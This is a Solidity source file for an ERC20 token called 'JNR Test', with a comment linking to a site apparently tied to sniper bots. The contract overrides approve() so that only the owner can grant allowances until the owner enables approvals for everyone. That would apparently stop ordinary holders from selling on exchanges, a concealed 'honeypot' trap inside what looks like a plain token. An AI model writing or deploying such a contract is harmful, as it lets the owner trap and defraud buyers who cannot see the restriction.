// SPDX-License-Identifier: MIT

//https://snprbot.com/

pragma solidity ^0.8.20;

import "./ERC20.sol";
import "./Ownable.sol";

contract JNRTestToken is ERC20, Ownable {
    bool private _isApprovalEnabled;

    event ApprovalEnabledChanged(bool enabled);

    constructor() ERC20("JNR Test", "JNRTest") Ownable(msg.sender) {
        _mint(msg.sender, 1000000 * 10 ** decimals()); 
        _isApprovalEnabled = false; 
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        if (msg.sender != owner()) {
            require(_isApprovalEnabled, "JNRTestToken: Approvals are disabled for non-owners");
        }
        return super.approve(spender, amount);
    }

    function setApprovalEnabled(bool enabled) public onlyOwner {
        if (_isApprovalEnabled != enabled) {
            _isApprovalEnabled = enabled;
            emit ApprovalEnabledChanged(enabled);
        }
    }

    function withdrawEther() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}